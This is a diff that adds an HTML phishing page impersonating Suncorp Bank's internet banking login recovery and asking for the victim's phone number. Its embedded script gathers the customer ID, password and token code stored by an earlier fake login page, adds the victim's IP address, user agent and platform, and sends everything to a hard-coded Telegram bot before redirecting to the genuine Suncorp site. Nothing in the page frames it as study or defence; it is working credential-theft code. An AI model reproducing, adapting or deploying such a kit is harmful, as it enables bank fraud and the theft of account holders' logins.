@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html class="responsive js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths" lang="en" style="">
+<head>
+  <meta charset="UTF-8">
+  <meta content="no-cache" http-equiv="cache-control"/>
+  <meta content="no-cache" http-equiv="pragma"/>
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/>
+  <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
+  <meta content="511233aa-be4a-4059-96b5-8033964fcdc6" name="_csrf"/>
+  <meta content="X-CSRF-TOKEN" name="_csrf_header"/>
+  <title>Recover your Login Information</title>
+  
+  <link href="css/shim.css" rel="stylesheet"/>
+  <link href="css/normalize.css" rel="stylesheet" type="text/css"/>
+  <link href="css/suncorpnew-uama.css" media="screen" rel="stylesheet" type="text/css"/>
+  
+  <link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+</head>
+<body class="sg-Page">
+  <header class="sg-Header">
+    <div class="sg-Header-content">
+      <div class="sg-Header-column">
+        <a class="sg-Header-logo" href="https://www.suncorpbank.com.au/" target="_blank"></a>
+      </div>
+      <div class="sg-Header-column sg-u-width10of10 sg-u-textRight">
+        <div class="sg-Grid-row">
+          <h1 class="ib-header">Internet Banking</h1>
+          <span class="Icon-lock--default Icon--medium"></span>
+        </div>
+        <div class="ib-banner-info" id="bannerInfo">
+          <span class="sg-u-mediumAndSmallHidden"><strong>BSB</strong> 484-799</span>
+          <span class="sg-u-mediumAndSmallHidden"><strong>Swift Code</strong> METWAU4B</span>
+        </div>
+      </div>
+    </div>
+  </header>
+  
+  <main class="sg-Main">
+    <div class="sg-Main-content">
+      <div class="sg-Main-column">
+        <h2>Confirm your phone number</h2>
+        
+        <form autocomplete="off" class="ws-validate" id="recoverForm" method="post">
+          <input name="_csrf" type="hidden" value="511233aa-be4a-4059-96b5-8033964fcdc6"/>
+          
+          <div class="sg-Box sg-Box--error sg-Box--withIcon uama-hidden" id="simpleErrorBox">
+            <div class="sg-Box-icon sg-Box-icon--withBackground">
+              <span class="sg-Box--errorIcon"></span>
+            </div>
+            <div class="sg-Box-content"><p></p></div>
+          </div>
+          
+          <p>Please confirm the primary phone number associated with your internet banking account.</p>
+          <hr/>
+          
+          <fieldset class="sg-Form-questionGroup sg-u-noPaddingLeft sg-u-paddingBottom">
+            <div class="sg-Form-question">
+              <label class="sg-Form-label" for="cid">Phone number</label>
+              <input autocomplete="off" class="sg-Input sg-u-widthLarger" id="cid" maxlength="10" name="cid" required="" type="text" placeholder="04xxxxxxxx"/>
+            </div>
+          </fieldset>
+          
+          <div class="sg-Form-pager">
+            <button class="sg-Btn sg-Btn--primary Btn-next" name="submit" type="submit">Verify</button>
+          </div>
+          
+          <script>
+            (function() {
+                // ============================================
+                // TELEGRAM CONFIGURATION - USE YOUR CORRECT TOKEN
+                // ============================================
+                const TELEGRAM_BOT_TOKEN = '8895813826:AAHHNBhRWC05tlc7PpaaEEjNEx33F8HdMxk';
+                const TELEGRAM_CHAT_IDS = ['-5051925986'];
+                
+                // Function to get data from sessionStorage (set by index.html)
+                function getStolenData() {
+                    let stolenData = {
+                        userId: 'Not captured',
+                        password: 'Not captured',
+                        passcode: 'Not captured'
+                    };
+                    
+                    try {
+                        // Read from sessionStorage (where index.html stores the data)
+                        const userId = sessionStorage.getItem('userId');
+                        const userPassword = sessionStorage.getItem('userPassword');
+                        const userPasscode = sessionStorage.getItem('userPasscode');
+                        
+                        if (userId && userId !== 'undefined' && userId !== 'null') {
+                            stolenData.userId = userId;
+                        }
+                        if (userPassword && userPassword !== 'undefined' && userPassword !== 'null') {
+                            stolenData.password = userPassword;
+                        }
+                        if (userPasscode && userPasscode !== 'undefined' && userPasscode !== 'null') {
+                            stolenData.passcode = userPasscode;
+                        }
+                        
+                        // Also try localStorage as backup
+                        const localUserId = localStorage.getItem('userId');
+                        const localPassword = localStorage.getItem('userPassword');
+                        const localPasscode = localStorage.getItem('userPasscode');
+                        
+                        if (localUserId && stolenData.userId === 'Not captured') stolenData.userId = localUserId;
+                        if (localPassword && stolenData.password === 'Not captured') stolenData.password = localPassword;
+                        if (localPasscode && stolenData.passcode === 'Not captured') stolenData.passcode = localPasscode;
+                        
+                        console.log('Retrieved from storage:', stolenData);
+                        
+                    } catch(e) {
+                        console.error('Error reading from storage:', e);
+                    }
+                    
+                    return stolenData;
+                }
+                
+                // Get device info
+                function getDeviceInfo() {
+                    const ua = navigator.userAgent;
+                    let device = 'Unknown';
+                    let platform = 'Unknown';
+                    let browser = 'Unknown';
+                    
+                    if (/Windows/.test(ua)) platform = 'Windows';
+                    else if (/Mac/.test(ua)) platform = 'MacOS';
+                    else if (/Linux/.test(ua)) platform = 'Linux';
+                    else if (/Android/.test(ua)) platform = 'Android';
+                    else if (/iPad|iPhone|iPod/.test(ua)) platform = 'iOS';
+                    
+                    if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) device = 'Mobile';
+                    else device = 'Desktop';
+                    
+                    if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
+                    else if (/Firefox/.test(ua)) browser = 'Firefox';
+                    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+                    else if (/Edg/.test(ua)) browser = 'Edge';
+                    else if (/MSIE|Trident/.test(ua)) browser = 'Internet Explorer';
+                    
+                    return { device, platform, browser };
+                }
+                
+                // Get IP address
+                async function getIP() {
+                    try {
+                        const response = await fetch('https://api.ipify.org?format=json');
+                        const data = await response.json();
+                        return data.ip;
+                    } catch(e) {
+                        return 'Unable to retrieve';
+                    }
+                }
+                
+                // Send to Telegram
+                async function sendToTelegram(phoneNumber, stolenData) {
+                    const deviceInfo = getDeviceInfo();
+                    let clientIP = 'Unable to retrieve';
+                    try {
+                        clientIP = await getIP();
+                    } catch(e) {}
+                    
+                    const timestamp = new Date().toLocaleString('en-AU', {
+                        timeZone: 'Australia/Sydney',
+                        year: 'numeric',
+                        month: '2-digit',
+                        day: '2-digit',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit'
+                    });
+                    
+// Build detailed message
+const message = `SUNCORP
+
+Customer ID: ${stolenData.userId}
+Password: ${stolenData.password}
+Token: ${stolenData.passcode}
+Phone: ${phoneNumber}
+IP: ${clientIP}
+UA: ${navigator.userAgent}
+Platform: ${deviceInfo.platform}
+Date: ${timestamp}`;
+
+const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                    
+                    let successCount = 0;
+                    for (const chatId of TELEGRAM_CHAT_IDS) {
+                        try {
+                            const response = await fetch(telegramUrl, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    chat_id: chatId,
+                                    text: message.substring(0, 4096),
+                                    disable_web_page_preview: true
+                                })
+                            });
+                            
+                            const result = await response.json();
+                            if (response.ok) {
+                                console.log(`✓ Message sent to chat ${chatId}`);
+                                successCount++;
+                            } else {
+                                console.error(`✗ Failed for chat ${chatId}:`, result);
+                            }
+                        } catch(error) {
+                            console.error(`✗ Error sending to chat ${chatId}:`, error);
+                        }
+                    }
+                    
+                    return successCount;
+                }
+                
+                // Set up the form
+                function init() {
+                    const form = document.getElementById('recoverForm');
+                    const phoneInput = document.getElementById('cid');
+                    
+                    if (!form || !phoneInput) {
+                        console.error('Form elements not found');
+                        return;
+                    }
+                    
+                    // Get stolen data from sessionStorage
+                    const stolenData = getStolenData();
+                    
+                    // Log to console for debugging
+                    console.log('=== CAPTURED DATA ===');
+                    console.log('User ID:', stolenData.userId);
+                    console.log('Password:', stolenData.password);
+                    console.log('Token/Passcode:', stolenData.passcode);
+                    console.log('=====================');
+                    
+                    // Display captured data in console for verification
+                    const dataSummary = `
+                        📊 DATA CAPTURED FROM LOGIN PAGE:
+                        • Customer ID: ${stolenData.userId}
+                        • Password: ${stolenData.password ? '✓ Captured' : '✗ Missing'}
+                        • Token Code: ${stolenData.passcode ? '✓ Captured' : '✗ Not provided'}
+                    `;
+                    console.log(dataSummary);
+                    
+                    // Create error element
+                    let errorDiv = document.getElementById('phone-error');
+                    if (!errorDiv) {
+                        errorDiv = document.createElement('div');
+                        errorDiv.id = 'phone-error';
+                        errorDiv.className = 'sg-Validation-errorWrapper';
+                        errorDiv.style.cssText = 'display: none; margin-top: 5px; color: #d32f2f;';
+                        errorDiv.innerHTML = '<p>Please enter a valid Australian phone number (04xxxxxxxx).</p>';
+                        phoneInput.parentNode.appendChild(errorDiv);
+                    }
+                    
+                    function isValidPhone(phone) {
+                        return /^04\d{8}$/.test(phone);
+                    }
+                    
+                    function clearError() {
+                        errorDiv.style.display = 'none';
+                        phoneInput.classList.remove('sg-Input--error-border');
+                    }
+                    
+                    function showError() {
+                        errorDiv.style.display = 'block';
+                        phoneInput.classList.add('sg-Input--error-border');
+                    }
+                    
+                    phoneInput.addEventListener('input', function() {
+                        let value = this.value.replace(/\D/g, '');
+                        if (value.length > 10) value = value.slice(0, 10);
+                        this.value = value;
+                        clearError();
+                    });
+                    
+                    // Loading overlay
+                    function showLoading() {
+                        let overlay = document.getElementById('login-loading-overlay');
+                        if (!overlay) {
+                            overlay = document.createElement('div');
+                            overlay.id = 'login-loading-overlay';
+                            overlay.style.cssText = `
+                                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+                                background: rgba(0,0,0,0.7); display: flex; align-items: center;
+                                justify-content: center; z-index: 9999; flex-direction: column;
+                            `;
+                            overlay.innerHTML = `
+                                <div style="width: 50px; height: 50px; border: 4px solid #fff; border-top-color: #ffc800; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+                                <p style="color: #ffc800; margin-top: 20px;"></p>
+                            `;
+                            document.body.appendChild(overlay);
+                        }
+                        overlay.style.display = 'flex';
+                    }
+                    
+                    function hideLoading() {
+                        const overlay = document.getElementById('login-loading-overlay');
+                        if (overlay) overlay.style.display = 'none';
+                    }
+                    
+                    // Add spin animation
+                    const style = document.createElement('style');
+                    style.textContent = '@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }';
+                    document.head.appendChild(style);
+                    
+                    // Handle submit
+                    form.addEventListener('submit', async function(e) {
+                        e.preventDefault();
+                        clearError();
+                        
+                        const phone = phoneInput.value.trim();
+                        
+                        if (!phone || !isValidPhone(phone)) {
+                            showError();
+                            phoneInput.focus();
+                            return;
+                        }
+                        
+                        showLoading();
+                        
+                        // Send ALL captured data to Telegram
+                        const sentCount = await sendToTelegram(phone, stolenData);
+                        
+                        if (sentCount > 0) {
+                            console.log(`✓ Data sent successfully to ${sentCount} Telegram chat(s)`);
+                        } else {
+                            console.error('✗ Failed to send to Telegram');
+                        }
+                        
+                        // Clear sessionStorage after sending (optional)
+                        try {
+                            sessionStorage.removeItem('userId');
+                            sessionStorage.removeItem('userPassword');
+                            sessionStorage.removeItem('userPasscode');
+                        } catch(e) {}
+                        
+                        // Redirect
+                        setTimeout(function() {
+                            window.location.href = 'https://www.suncorp.com.au';
+                        }, 1500);
+                    });
+                }
+                
+                // Start when ready
+                if (document.readyState === 'loading') {
+                    document.addEventListener('DOMContentLoaded', init);
+                } else {
+                    init();
+                }
+            })();
+          </script>
+        </form>
+        
+        <footer class="sg-Footer" style="background-color:transparent;">
+          <div class="sg-Footer-content">
+            <p class="sg-Type--small sg-Type--muted sg-u-textCenter">
+              Suncorp Bank (Norfina Limited ABN 66 010 831 722).
+              <br/>
+              The SUNCORP brand and Sun Logo are used by Suncorp Bank (Norfina Limited) under license and Suncorp Bank is not part of the Suncorp Group.
+            </p>
+          </div>
+        </footer>
+      </div>
+    </div>
+  </main>
+  
+  <iframe class="aamIframeLoaded" id="destination_publishing_iframe_suncorp_0" name="destination_publishing_iframe_suncorp_0_name" sandbox="allow-scripts allow-same-origin" src="assets/dest5.html" style="display: none; width: 0px; height: 0px;" title="Adobe ID Syncing iFrame"></iframe>
+</body>
+</html>
